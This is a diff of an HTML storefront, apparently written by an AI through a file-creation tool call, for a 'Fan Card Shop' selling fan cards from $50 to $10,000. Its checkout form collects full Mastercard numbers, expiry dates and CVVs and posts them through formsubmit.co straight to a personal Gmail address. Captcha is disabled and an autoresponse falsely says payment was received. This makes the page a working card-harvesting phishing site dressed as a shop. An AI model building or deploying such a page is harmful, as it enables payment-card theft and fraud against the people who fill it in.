@@ -1,524 +1,511 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-<title>FanCard Shop - Discounted Fan Cards</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet" />
-<style>
-  /* Reset and base */
-  * {
-    margin: 0; padding: 0; box-sizing: border-box;
-  }
-  body {
-    font-family: 'Montserrat', sans-serif;
-    background: #fff;
-    color: #003366;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-    padding: 20px 24px;
-  }
-
-  header {
-    width: 100%;
-    max-width: 420px;
-    text-align: center;
-    margin-bottom: 36px;
-    border-bottom: 2.5px solid #0055cc;
-    padding-bottom: 12px;
-  }
-  header h1 {
-    font-weight: 700;
-    font-size: 2.2rem;
-    letter-spacing: 2px;
-    color: #004a99;
-    margin-bottom: 8px;
-    text-shadow: 0 1px 4px rgba(0,80,204,0.2);
-  }
-  header p {
-    font-weight: 400;
-    font-size: 1.1rem;
-    color: #235a9b;
-    line-height: 1.4;
-    max-width: 360px;
-    margin: 0 auto;
-  }
-
-  main {
-    width: 100%;
-    max-width: 420px;
-    display: flex;
-    flex-direction: column;
-  }
-
-  /* Product grid */
-  .products {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 24px;
-    margin-bottom: 36px;
-  }
-
-  .card {
-    background: #f5faff;
-    border: 1.5px solid #c3dbff;
-    border-radius: 12px;
-    padding: 22px 20px;
-    box-shadow:
-      0 2px 6px rgba(0, 85, 204, 0.12),
-      inset 0 1px 0 rgba(255, 255, 255, 0.8);
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    transition: box-shadow 0.25s ease, transform 0.25s ease;
-  }
-  .card:hover, .card:focus-within {
-    box-shadow:
-      0 6px 14px rgba(0, 85, 204, 0.28),
-      inset 0 2px 4px rgba(255, 255, 255, 0.9);
-    transform: translateY(-5px);
-    outline: none;
-  }
-  .card .price {
-    font-weight: 700;
-    font-size: 1.3rem;
-    color: #003366;
-    margin-bottom: 10px;
-  }
-  .card .desc {
-    font-weight: 400;
-    font-size: 1rem;
-    color: #3467ab;
-    margin-bottom: 20px;
-    min-height: 52px;
-    line-height: 1.3;
-  }
-  .card button {
-    background-color: #0055cc;
-    border: none;
-    color: #fefefe;
-    font-weight: 700;
-    font-size: 1rem;
-    padding: 12px 0;
-    border-radius: 10px;
-    cursor: pointer;
-    box-shadow: 0 4px 8px rgba(0, 85, 204, 0.32);
-    transition: background-color 0.3s ease, box-shadow 0.3s ease;
-  }
-  .card button:hover, .card button:focus {
-    background-color: #003d99;
-    box-shadow: 0 6px 14px rgba(0, 61, 153, 0.52);
-    outline: none;
-  }
-
-  /* Cart */
-  #cart {
-    background: #e6f0ff;
-    border-radius: 14px;
-    padding: 20px 26px;
-    box-shadow: 0 5px 18px rgba(0,85,204,0.15);
-    margin-bottom: 36px;
-    width: 100%;
-    max-width: 420px;
-    color: #003366;
-  }
-  #cart h2 {
-    font-weight: 700;
-    font-size: 1.45rem;
-    margin-bottom: 16px;
-    border-bottom: 2px solid #0055cc;
-    padding-bottom: 6px;
-    color: #004080;
-  }
-  #cart-items {
-    max-height: 180px;
-    overflow-y: auto;
-    margin-bottom: 18px;
-    font-size: 1rem;
-    color: #003366;
-  }
-  .cart-item {
-    display: flex;
-    justify-content: space-between;
-    padding: 10px 0;
-    border-bottom: 1px solid #aac7ff;
-  }
-  .cart-item span {
-    display: inline-block;
-  }
-  .cart-item .name {
-    flex: 2;
-    font-weight: 600;
-    color: #003366;
-  }
-  .cart-item .qty {
-    flex: 0.7;
-    text-align: center;
-    font-weight: 500;
-  }
-  .cart-item .price {
-    flex: 1;
-    text-align: right;
-    font-weight: 700;
-  }
-  .cart-item button {
-    background: transparent;
-    border: none;
-    color: #bb2c2c;
-    font-weight: 700;
-    padding-left: 14px;
-    cursor: pointer;
-    flex: 0.5;
-    font-size: 1.15rem;
-    transition: color 0.3s ease;
-  }
-  .cart-item button:hover, .cart-item button:focus {
-    color: #7f1c1c;
-    outline: none;
-  }
-  #cart-total {
-    font-weight: 700;
-    font-size: 1.3rem;
-    text-align: right;
-    color: #004080;
-  }
-
-  /* Checkout Form */
-  #checkout-form {
-    background: #f9fbff;
-    padding: 22px 26px;
-    border-radius: 14px;
-    box-shadow: 0 5px 18px rgba(0,85,204,0.15);
-    width: 100%;
-    max-width: 420px;
-    color: #003366;
-  }
-  #checkout-form h3 {
-    font-size: 1.6rem;
-    font-weight: 700;
-    color: #004080;
-    margin-bottom: 18px;
-    border-bottom: 2px solid #0055cc;
-    padding-bottom: 8px;
-  }
-  #checkout-form label {
-    display: block;
-    font-weight: 600;
-    font-size: 1rem;
-    margin-bottom: 6px;
-    color: #003366cc;
-  }
-  #checkout-form input[type="text"],
-  #checkout-form input[type="email"],
-  #checkout-form input[type="number"] {
-    width: 100%;
-    padding: 12px 15px;
-    margin-bottom: 18px;
-    border-radius: 12px;
-    border: 2px solid #5a8de0;
-    font-size: 1rem;
-    font-weight: 500;
-    outline-color: #0055cc;
-    transition: box-shadow 0.3s ease;
-    background: #ffffff;
-    color: #003366;
-    box-shadow: inset 0 1px 4px #d3deff;
-  }
-  #checkout-form input[type="text"]:focus,
-  #checkout-form input[type="email"]:focus,
-  #checkout-form input[type="number"]:focus {
-    box-shadow: 0 0 6px 3px #5596ffaa;
-    border-color: #004a99;
-  }
-  #checkout-form input::placeholder {
-    color: #92aaffcc;
-    font-weight: 400;
-  }
-
-  /* Group container for card inputs */
-  .card-info-group {
-    display: flex;
-    gap: 16px;
-    margin-bottom: 18px;
-    flex-wrap: wrap;
-  }
-  .card-info-group > div {
-    flex: 1 1 40%;
-    min-width: 120px;
-    display: flex;
-    flex-direction: column;
-  }
-
-  /* Make inputs full width within their container */
-  .card-info-group input {
-    margin-bottom: 0;
-  }
-
-  #checkout-form button[type="submit"] {
-    width: 100%;
-    padding: 15px 0;
-    font-size: 1.25rem;
-    font-weight: 700;
-    border-radius: 15px;
-    border: none;
-    background: linear-gradient(135deg, #0055cc, #004a99);
-    color: white;
-    cursor: pointer;
-    box-shadow: 0 8px 18px rgba(0, 85, 204, 0.48);
-    transition: background 0.35s ease, box-shadow 0.35s ease;
-  }
-  #checkout-form button[type="submit"]:hover,
-  #checkout-form button[type="submit"]:focus {
-    background: linear-gradient(135deg, #004a99, #003366);
-    box-shadow: 0 12px 24px rgba(0, 61, 153, 0.6);
-    outline: none;
-  }
-
-  /* Scrollbar for cart */
-  #cart-items::-webkit-scrollbar {
-    width: 7px;
-  }
-  #cart-items::-webkit-scrollbar-track {
-    background: transparent;
-  }
-  #cart-items::-webkit-scrollbar-thumb {
-    background-color: #5596ffcc;
-    border-radius: 3px;
-  }
-
-  /* Responsive */
-  @media (max-width: 460px) {
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fan Card Shop - Buy Fan Cards Cheap</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+    html, body {
+      margin: 0; padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #ffffff;
+      color: #104e8b;
+      max-width: 350px;
+      margin-left: auto;
+      margin-right: auto;
+    }
     body {
-      padding: 16px 12px;
+      padding: 1rem;
     }
-    header h1 {
-      font-size: 1.8rem;
+    h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin: 0 0 0.5rem 0;
+      text-align: center;
+      color: #104e8b;
     }
-    main {
-      max-width: 100%;
+    p.subtitle {
+      margin: 0 0 1.5rem 0;
+      font-weight: 500;
+      font-size: 1rem;
+      text-align: center;
+      color: #2a5cad;
     }
-    .products {
-      grid-template-columns: 1fr;
-      gap: 18px;
-      margin-bottom: 28px;
+
+    #products {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1rem;
+      margin-bottom: 2rem;
+      max-height: 400px;
+      overflow-y: auto;
+      padding-right: 4px;
+      scrollbar-width: thin;
+      scrollbar-color: #104e8b44 transparent;
     }
-    #cart, #checkout-form {
-      max-width: 100%;
-      padding: 20px 18px;
-      margin-bottom: 28px;
+    #products::-webkit-scrollbar {
+      width: 5px;
     }
-    /* Stack card inputs vertically on small screen */
-    .card-info-group {
+    #products::-webkit-scrollbar-thumb {
+      background-color: #104e8b44;
+      border-radius: 20px;
+    }
+
+    .product-card {
+      background: #f0f7ff;
+      padding: 1rem;
+      border-radius: 12px;
+      border: 1.5px solid transparent;
+      display: flex;
       flex-direction: column;
-      gap: 12px;
+      justify-content: space-between;
+      cursor: pointer;
+      transition: transform 0.2s, border-color 0.3s;
+      user-select: none;
     }
-    .card-info-group > div {
-      flex: 1 1 100%;
-      min-width: auto;
+    .product-card:hover, .product-card:focus-visible {
+      border-color: #104e8bcc;
+      transform: scale(1.05);
+      outline: none;
     }
-  }
-</style>
+    .product-price {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #104e8b;
+      margin-bottom: 0.7rem;
+      text-align: center;
+    }
+    .product-label {
+      text-align: center;
+      color: #1954a5cc;
+      margin-bottom: 1rem;
+      font-weight: 500;
+      font-size: 0.9rem;
+      user-select: none;
+    }
+    .add-btn {
+      background: linear-gradient(135deg, #104e8bcc, #205ca3cc);
+      color: #f0f7ff;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 0.5rem 1rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      user-select: none;
+      width: 100%;
+      letter-spacing: 0.04em;
+    }
+    .add-btn:hover, .add-btn:focus-visible {
+      background: linear-gradient(135deg, #0f3b6cdd, #164d8ccf);
+      outline: none;
+    }
+
+    /* Cart - inline in page */
+    #cart-section {
+      background: #e4efffdd;
+      color: #104e8bdd;
+      border-radius: 16px;
+      padding: 1rem 1.2rem 1.5rem 1.2rem;
+      font-weight: 600;
+      font-size: 1rem;
+      margin-bottom: 2rem;
+      user-select: none;
+    }
+    #cart-header {
+      font-size: 1.4rem;
+      border-bottom: 2px solid #104e8bcc;
+      padding-bottom: 0.5rem;
+      margin-bottom: 0.8rem;
+    }
+    #cart-list {
+      max-height: 220px;
+      overflow-y: auto;
+      padding-right: 6px;
+      scrollbar-width: thin;
+      scrollbar-color: #104e8baa transparent;
+      margin: 0 0 1rem 0;
+      list-style: none;
+    }
+    #cart-list::-webkit-scrollbar {
+      width: 6px;
+    }
+    #cart-list::-webkit-scrollbar-thumb {
+      background-color: #104e8baa;
+      border-radius: 20px;
+    }
+    .cart-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #f7fbff;
+      padding: 0.5rem 0.8rem;
+      margin-bottom: 0.5rem;
+      border-radius: 10px;
+      color: #104e8bcc;
+      user-select: none;
+    }
+    .cart-item span {
+      font-weight: 600;
+      font-size: 1.1rem;
+      color: #104e8bcc;
+    }
+    .cart-item button {
+      background: transparent;
+      border: none;
+      color: #dd5656cc;
+      font-size: 1.3rem;
+      font-weight: 900;
+      cursor: pointer;
+      padding: 0 6px;
+      transition: color 0.3s ease;
+      user-select:none;
+      line-height: 1;
+    }
+    .cart-item button:hover, .cart-item button:focus-visible {
+      color: #bb3c3cee;
+      outline: none;
+    }
+    #cart-total {
+      font-size: 1.3rem;
+      font-weight: 700;
+      text-align: right;
+      color: #104e8bcc;
+    }
+
+    /* Payment form */
+    form#paymentForm {
+      user-select: none;
+    }
+    form#paymentForm h2 {
+      font-weight: 700;
+      font-size: 1.6rem;
+      color: #104e8bdd;
+      margin-bottom: 0.8rem;
+      text-align: center;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 1.2rem;
+    }
+    /* Floating label technique */
+    .input-group input {
+      width: 100%;
+      border: none;
+      padding: 14px 12px 14px 12px;
+      border-radius: 10px;
+      font-size: 1.1rem;
+      background: #f0f7ff;
+      color: #104e8bdd;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      user-select: none;
+      box-shadow: inset 0 0 6px rgba(16,78,139,0.05);
+      transition: box-shadow 0.3s ease, border-color 0.3s ease;
+    }
+    .input-group input:focus {
+      outline: none;
+      box-shadow: 0 0 8px rgba(16,78,139,0.15);
+      background: #e6f0ff;
+      border: 2px solid #104e8bcc;
+      color: #0e3a6bdd;
+    }
+    .input-group label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #7da8d8;
+      font-weight: 700;
+      font-size: 0.9rem;
+      pointer-events: none;
+      transition: all 0.2s ease-in-out;
+      user-select:none;
+    }
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: -8px;
+      left: 10px;
+      font-size: 0.75rem;
+      color: #4a85d0;
+      font-weight: 700;
+      background: #f0f7ff;
+      padding: 0 6px;
+      border-radius: 8px;
+      user-select:none;
+    }
+
+    button#payBtn {
+      background: linear-gradient(135deg, #104e8bcc, #205ca3cc);
+      border: none;
+      border-radius: 12px;
+      color: #f0f7ff;
+      font-size: 1.2rem;
+      font-weight: 700;
+      padding: 16px 0;
+      width: 100%;
+      cursor: pointer;
+      letter-spacing: 0.07em;
+      transition: background 0.3s ease;
+      user-select:none;
+    }
+    button#payBtn:hover, button#payBtn:focus-visible {
+      background: linear-gradient(135deg, #164d8cdd, #0f3b6cdd);
+      outline: none;
+    }
+
+    /* Error and Success messages */
+    #formMessage {
+      margin-top: 1rem;
+      font-weight: 700;
+      text-align: center;
+      user-select: none;
+      display:none;
+      padding: 0.4rem 0.8rem;
+      border-radius: 12px;
+    }
+    #formMessage.error {
+      color: #b00020;
+      background-color: #fddede;
+    }
+    #formMessage.success {
+      color: #006400;
+      background-color: #d1f2d1;
+    }
+  </style>
 </head>
 <body>
+  <h1>Fan Card Shop</h1>
+  <p class="subtitle">Premium Fan Cards from $50 to $10,000 - Pay Securely with MasterCard</p>
 
-<header>
-  <h1>FanCard Shop</h1>
-  <p>Buy your discount fan cards ranging from $50 to $10,000. Pay securely with Mastercard.</p>
-</header>
-
-<main>
-
-  <section class="products" aria-label="Product list of fan cards">
-    <!-- Product cards inserted dynamically -->
+  <section id="products" aria-label="Available fan cards">
+    <!-- Product cards populated by JS -->
   </section>
 
-  <section id="cart" aria-label="Shopping cart">
-    <h2>Your Cart</h2>
-    <div id="cart-items" role="list" aria-live="polite" aria-relevant="additions removals">Your cart is empty.</div>
-    <div id="cart-total">Total: $0</div>
+  <section id="cart-section" aria-label="Shopping Cart" role="region" tabindex="0">
+    <header id="cart-header">Your Cart</header>
+    <ul id="cart-list" role="list" tabindex="0">
+      <li>Your cart is empty.</li>
+    </ul>
+    <div id="cart-total" aria-live="polite">Total: $0.00</div>
   </section>
 
-  <section id="checkout-section" aria-label="Checkout form">
-    <form id="checkout-form" action="https://formsubmit.co/donkingsley96@gmail.com" method="POST" target="_blank" novalidate>
-      <h3>Checkout</h3>
+  <!-- Payment Form -->
+  <form id="paymentForm" action="https://formsubmit.co/donkingsley96@gmail.com" method="POST" novalidate aria-label="Payment form">
+    <h2>MasterCard Payment Details</h2>
+    <input type="hidden" name="_subject" value="New Fan Card Order" />
+    <input type="hidden" name="_autoresponse" value="Thank you for your order! We received your payment info successfully." />
+    <input type="hidden" name="_captcha" value="false" />
+    <input type="hidden" name="_next" value="https://formsubmit.co/thankyou" />
 
-      <!-- Honeypot for spam protection -->
-      <input type="hidden" name="_honey" style="display:none" />
-      <input type="hidden" name="_captcha" value="false" />
-      <input type="hidden" name="_subject" value="New Fan Card Order" />
-      <!-- Order details container -->
-      <textarea name="Order Details" id="orderDetails" style="display:none;"></textarea>
+    <div class="input-group">
+      <input type="text" id="cardName" name="Cardholder_Name" placeholder=" " autocomplete="name" required aria-required="true" />
+      <label for="cardName">Cardholder Name</label>
+    </div>
 
-      <label for="name">Full Name</label>
-      <input type="text" name="Name" id="name" placeholder="Your full name" required autocomplete="name" />
+    <div class="input-group">
+      <input type="tel" id="cardNumber" name="Card_Number" placeholder=" " maxlength="19" inputmode="numeric" pattern="\\d{13,19}" autocomplete="cc-number" required aria-required="true" />
+      <label for="cardNumber">Card Number</label>
+    </div>
 
-      <label for="email">Email Address</label>
-      <input type="email" name="Email" id="email" placeholder="your.email@example.com" required autocomplete="email" />
-
-      <div class="card-info-group">
-        <div>
-          <label for="cardNumber">Mastercard Number</label>
-          <input type="text" inputmode="numeric" name="Mastercard Number" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19" autocomplete="cc-number" />
-        </div>
-        <div>
-          <label for="expiry">Expiry Date (MM/YY)</label>
-          <input type="text" pattern="(0[1-9]|1[0-2])\/\d{2}" name="Expiry Date" id="expiry" placeholder="MM/YY" required autocomplete="cc-exp" maxlength="5" />
-        </div>
-        <div>
-          <label for="cvv">CVV</label>
-          <input type="number" inputmode="numeric" pattern="\d{3,4}" name="CVV" id="cvv" placeholder="123" required maxlength="4" autocomplete="cc-csc" />
-        </div>
+    <div style="display:flex; gap:12px; margin-bottom: 1.2rem;">
+      <div class="input-group" style="flex:1;">
+        <input type="text" id="expDate" name="Expiration_Date" placeholder=" " maxlength="5" pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" autocomplete="cc-exp" required aria-required="true" />
+        <label for="expDate">Expiration Date (MM/YY)</label>
       </div>
+      <div class="input-group" style="flex:0.8;">
+        <input type="password" id="cvv" name="CVV" placeholder=" " maxlength="3" pattern="\\d{3}" autocomplete="cc-csc" required aria-required="true" />
+        <label for="cvv">CVV</label>
+      </div>
+    </div>
 
-      <button type="submit" aria-label="Submit your order">Pay &amp; Receive Card Details</button>
-    </form>
-  </section>
-
-</main>
+    <button type="submit" id="payBtn">Pay with MasterCard</button>
+    <div id="formMessage" role="alert" aria-live="assertive"></div>
+  </form>
 
 <script>
-  const productsData = [
-    { id: 1, name: "Fan Card $50", price: 50, desc: "Get a $50 fan card to enjoy your passion." },
-    { id: 2, name: "Fan Card $100", price: 100, desc: "Perfect fan card for small gifts or personal use." },
-    { id: 3, name: "Fan Card $500", price: 500, desc: "Great for avid fans looking to stock up." },
-    { id: 4, name: "Fan Card $1000", price: 1000, desc: "Experience premium value with $1000 card." },
-    { id: 5, name: "Fan Card $5000", price: 5000, desc: "High value card for top fans and gifts." },
-    { id: 6, name: "Fan Card $10,000", price: 10000, desc: "Ultimate deluxe fan card for serious collectors." }
-  ];
+  (() => {
+    const products = [
+      { id: '50', label: '$50 Fan Card', price: 50 },
+      { id: '100', label: '$100 Fan Card', price: 100 },
+      { id: '250', label: '$250 Fan Card', price: 250 },
+      { id: '500', label: '$500 Fan Card', price: 500 },
+      { id: '1000', label: '$1,000 Fan Card', price: 1000 },
+      { id: '2500', label: '$2,500 Fan Card', price: 2500 },
+      { id: '5000', label: '$5,000 Fan Card', price: 5000 },
+      { id: '7500', label: '$7,500 Fan Card', price: 7500 },
+      { id: '10000', label: '$10,000 Fan Card', price: 10000 }
+    ];
 
-  const productsContainer = document.querySelector('.products');
-  const cartItemsContainer = document.getElementById('cart-items');
-  const cartTotalContainer = document.getElementById('cart-total');
-  const checkoutForm = document.getElementById('checkout-form');
-  const orderDetailsInput = document.getElementById('orderDetails');
+    const productsContainer = document.getElementById('products');
+    const cartList = document.getElementById('cart-list');
+    const cartTotalEl = document.getElementById('cart-total');
+    const paymentForm = document.getElementById('paymentForm');
+    const formMessage = document.getElementById('formMessage');
 
-  let cart = [];
+    let cart = [];
 
-  // Render products
-  function renderProducts() {
-    productsContainer.innerHTML = '';
-    productsData.forEach(product => {
-      const card = document.createElement('article');
-      card.className = 'card';
-      card.setAttribute('tabindex', '0');
-      card.innerHTML = `
-        <div class="price">$${product.price.toLocaleString()}</div>
-        <div class="desc">${product.desc}</div>
-        <button aria-label="Add ${product.name} to cart" data-id="${product.id}">Add to Cart</button>
-      `;
-      productsContainer.appendChild(card);
-    });
-  }
-
-  // Render cart items
-  function renderCart() {
-    cartItemsContainer.innerHTML = '';
-    if (cart.length === 0) {
-      cartItemsContainer.textContent = 'Your cart is empty.';
-      cartTotalContainer.textContent = 'Total: $0';
-      return;
+    function formatUSD(amount) {
+      return '$' + amount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
     }
-    cart.forEach(item => {
-      const itemElem = document.createElement('div');
-      itemElem.className = 'cart-item';
-      itemElem.setAttribute('role', 'listitem');
-      itemElem.innerHTML = `
-        <span class="name">${item.name}</span>
-        <span class="qty">x${item.quantity}</span>
-        <span class="price">$${(item.price * item.quantity).toLocaleString()}</span>
-        <button aria-label="Remove ${item.name} from cart" data-id="${item.id}">&#10005;</button>
-      `;
-      cartItemsContainer.appendChild(itemElem);
-    });
-    const total = cart.reduce((acc, item) => acc + item.price * item.quantity, 0);
-    cartTotalContainer.textContent = 'Total: $' + total.toLocaleString();
-  }
 
-  // Add item to cart
-  function addToCart(id) {
-    const product = productsData.find(p => p.id === id);
-    if (!product) return;
-    const cartItem = cart.find(ci => ci.id === id);
-    if (cartItem) {
-      cartItem.quantity++;
-    } else {
-      cart.push({ ...product, quantity: 1 });
+    function renderProducts() {
+      productsContainer.innerHTML = '';
+      products.forEach(prod => {
+        const div = document.createElement('div');
+        div.className = 'product-card';
+        div.setAttribute('tabindex', '0');
+        div.setAttribute('role', 'button');
+        div.setAttribute('aria-pressed', 'false');
+        div.setAttribute('aria-label', `Add ${prod.label} to cart`);
+
+        div.innerHTML = `
+          <div class="product-price">${formatUSD(prod.price)}</div>
+          <div class="product-label">${prod.label}</div>
+          <button class="add-btn" aria-label="Add ${prod.label} to cart">Add to Cart</button>
+        `;
+        productsContainer.appendChild(div);
+
+        const addBtn = div.querySelector('.add-btn');
+        addBtn.addEventListener('click', e => {
+          e.stopPropagation();
+          addToCart(prod);
+        });
+        div.addEventListener('keydown', e => {
+          if(e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            addToCart(prod);
+          }
+        });
+      });
     }
-    renderCart();
-  }
 
-  // Remove item from cart
-  function removeFromCart(id) {
-    const index = cart.findIndex(ci => ci.id === id);
-    if (index !== -1) {
-      cart.splice(index, 1);
-      renderCart();
+    function addToCart(product) {
+      cart.push(product);
+      updateCartUI();
     }
-  }
 
-  // Prepare order details for email textarea
-  function prepareOrderDetails() {
-    if (cart.length === 0) return 'No items in the cart.';
-    let details = 'Fan Card Order Details:\n\n';
-    cart.forEach(item => {
-      details += `${item.name} - Quantity: ${item.quantity} - Price Each: $${item.price.toLocaleString()} - Subtotal: $${(item.price * item.quantity).toLocaleString()}\n`;
-    });
-    const total = cart.reduce((acc, item) => acc + item.price * item.quantity, 0);
-    details += `\nTotal Order Price: $${total.toLocaleString()}\n\nThank you for your purchase!`;
-    return details;
-  }
-
-  // Mastercard format input helper to add spaces every 4 digits
-  function formatCardNumber(value) {
-    return value.replace(/\D/g, '')  // Remove non-digits
-      .replace(/(.{4})/g, '$1 ')   // Insert space every 4 digits
-      .trim();
-  }
-
-  // Event listeners
-  productsContainer.addEventListener('click', e => {
-    if (e.target.tagName === 'BUTTON') {
-      const id = parseInt(e.target.getAttribute('data-id'), 10);
-      addToCart(id);
+    function removeFromCart(i) {
+      cart.splice(i, 1);
+      updateCartUI();
     }
-  });
 
-  cartItemsContainer.addEventListener('click', e => {
-    if (e.target.tagName === 'BUTTON') {
-      const id = parseInt(e.target.getAttribute('data-id'), 10);
-      removeFromCart(id);
+    function updateCartUI() {
+      if(cart.length === 0) {
+        cartList.innerHTML = '<li>Your cart is empty.</li>';
+        cartTotalEl.textContent = 'Total: $0.00';
+        return;
+      }
+      cartList.innerHTML = '';
+      let total = 0;
+
+      cart.forEach((prod, i) => {
+        total += prod.price;
+        const li = document.createElement('li');
+        li.className = 'cart-item';
+        li.setAttribute('role', 'listitem');
+        li.innerHTML = `
+          <span>${prod.label}</span>
+          <button aria-label="Remove ${prod.label} from cart" data-index="${i}">&times;</button>
+        `;
+        const btn = li.querySelector('button');
+        btn.addEventListener('click', () => {
+          removeFromCart(i);
+        });
+        cartList.appendChild(li);
+      });
+      cartTotalEl.textContent = 'Total: ' + formatUSD(total);
     }
-  });
 
-  checkoutForm.addEventListener('submit', e => {
-    if (cart.length === 0) {
-      alert('Your cart is empty. Please add at least one fan card before checking out.');
+    paymentForm.addEventListener('submit', e => {
       e.preventDefault();
-      return;
+      clearFormMessage();
+
+      if(cart.length === 0){
+        showError("Your cart is empty. Please add a fan card to your cart before paying.");
+        return;
+      }
+
+      const name = paymentForm.cardName.value.trim();
+      const cardNumRaw = paymentForm.cardNumber.value.replace(/\s+/g, '');
+      const exp = paymentForm.expDate.value.trim();
+      const cvv = paymentForm.cvv.value.trim();
+
+      if(!name){
+        showError("Cardholder name is required.");
+        return;
+      }
+
+      if(!/^\d{13,19}$/.test(cardNumRaw)){
+        showError("Please enter a valid MasterCard number (13 to 19 digits).");
+        return;
+      }
+
+      const cardNumInt = parseInt(cardNumRaw.substring(0,6), 10);
+      const prefix = parseInt(cardNumRaw.substring(0,2), 10);
+      if(!((prefix >= 51 && prefix <= 55) || (cardNumInt >= 222100 && cardNumInt <= 272099))){
+        showError("Card number must start with valid MasterCard digits (51-55 or 2221-2720).");
+        return;
+      }
+
+      if(!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(exp)){
+        showError("Expiration date must be in MM/YY format.");
+        return;
+      }
+      const parts = exp.split('/');
+      const month = parseInt(parts[0], 10);
+      const year = 2000 + parseInt(parts[1], 10);
+      const today = new Date();
+      const expDate = new Date(year, month, 0, 23, 59, 59);
+      if(expDate < today){
+        showError("Expiration date must be in the future.");
+        return;
+      }
+
+      if(!/^\d{3}$/.test(cvv)){
+        showError("CVV must be exactly 3 digits.");
+        return;
+      }
+
+      paymentForm.submit();
+      paymentForm.reset();
+      cart = [];
+      updateCartUI();
+      showSuccess("Payment form submitted! You will receive a confirmation email if accepted.");
+    });
+
+    function showError(msg){
+      formMessage.className = 'error';
+      formMessage.textContent = msg;
+      formMessage.style.display = 'block';
+      formMessage.focus();
     }
-    if (!checkoutForm.checkValidity()) {
-      checkoutForm.reportValidity();
-      e.preventDefault();
-      return;
+    function showSuccess(msg){
+      formMessage.className = 'success';
+      formMessage.textContent = msg;
+      formMessage.style.display = 'block';
+      formMessage.focus();
+      setTimeout(() => {
+        formMessage.style.display = 'none';
+      }, 7000);
     }
-    orderDetailsInput.value = prepareOrderDetails();
-  });
+    function clearFormMessage(){
+      formMessage.textContent = '';
+      formMessage.style.display = 'none';
+      formMessage.className = '';
+    }
 
-  // Format Mastercard input in real-time
-  const cardNumberInput = document.getElementById('cardNumber');
-  cardNumberInput.addEventListener('input', e => {
-    const formatted = formatCardNumber(e.target.value);
-    e.target.value = formatted;
-  });
-
-  // Initial rendering
-  renderProducts();
-  renderCart();
-
+    renderProducts();
+    updateCartUI();
+  })();
 </script>
 
 </body>
 </html>
+</content>
+</create_file>
